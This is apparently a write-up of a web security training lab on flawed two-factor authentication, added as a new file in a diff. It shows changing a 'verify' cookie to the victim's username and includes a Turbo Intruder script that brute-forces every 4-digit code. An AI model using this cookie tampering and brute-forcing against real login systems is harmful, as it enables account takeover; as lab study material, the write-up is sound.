@@ -1,0 +1,47 @@
+Lab: 2FA broken logic
+
+Vulnerabiliy - This lab's two-factor authentication is vulnerable due to its flawed logic
+
+Goal - To solve the lab, access Carlos's account page.
+
+        Your credentials: wiener:peter
+        Victim's username: carlos
+    You also have access to the email server to receive your 2FA verification code.
+
+Analysis:
+1. Log in with credential wiener:peter, we have to verify the verification code from email which is a 4-digit number.
+=> Notice that, when we enter username and password, the url is /login
+=> When we submit it, we redirect to /login2
+=> See that header contains Cookie: verify=wiener => We can change this value to carlos
+
+2. Change verify=carlos in /login2
+=> Try to brute-force verification code
+
+3. Using Turbo Intruder to brute-force verification code
+=> Code: 
+def queueRequests(target, wordlists):
+
+    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
+    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
+    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+
+    # the 'gate' argument withholds part of each request until openGate is invoked
+    # if you see a negative timestamp, the server responded before the request was complete
+    for i in range(0000, 1000):
+        engine.queue(target.req, "{:04}".format(i), gate='race1')
+
+    # once every 'race1' tagged request has been queued
+    # invoke engine.openGate() to send them in sync
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+=> We will change the range of i from 0 to 10000 
+=> and find the response which has status code 302
+
